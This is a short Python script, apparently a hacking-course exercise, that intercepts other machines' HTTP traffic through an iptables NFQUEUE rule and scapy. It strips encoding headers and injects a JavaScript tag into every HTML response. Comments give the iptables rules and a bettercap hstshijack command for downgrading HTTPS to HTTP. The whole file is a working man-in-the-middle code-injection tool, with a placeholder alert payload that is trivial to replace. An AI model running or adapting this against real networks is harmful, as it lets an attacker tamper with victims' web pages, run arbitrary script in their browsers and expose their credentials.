#!/usr/bin/env python
# iptables -I FORWARD -j NFQUEUE --queue-num 0 (TRAPPING REQUESTS IN A QUEUE)
# iptables --flush (TO DELETE ALL THE IPTABLES *MAKE SURE TO DO THIS)
# USE OUTPUT/INPUT WHILE USING BETTERCAP
# BETTERCAP USED TO DOWNGRADE HTTPS TO HTTP
# bettercap -iface eth0 -caplet hstshijack/hstshijack
# This command strips the SSL from the response
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 (REDIRECTING PACKETS TO THE QUEUE)
# iptables -I INPUT -j NFQUEUE --queue-num 0


import netfilterqueue as netq
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub( "Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            print(scapy_packet.show())
            injection_code = "<script>alert('test')</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_seach = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_seach and "text/html" in load:
                content_length = content_length_seach.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# Accept-Encoding:.*?\\r\\n
